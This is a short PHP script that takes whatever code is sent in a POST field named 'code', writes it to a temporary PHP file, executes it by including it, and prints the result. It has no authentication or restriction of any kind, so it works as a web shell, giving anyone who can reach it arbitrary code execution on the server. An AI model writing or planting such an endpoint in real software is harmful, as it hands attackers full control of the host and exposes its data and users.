<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["code"])) {
    $code = $_POST["code"];
    $tempFile = tempnam(sys_get_temp_dir(), "code_") . ".php";
    file_put_contents($tempFile, $code);
    ob_start();
    include($tempFile);
    $output = ob_get_clean();
    unlink($tempFile);
    echo $output;
}
?>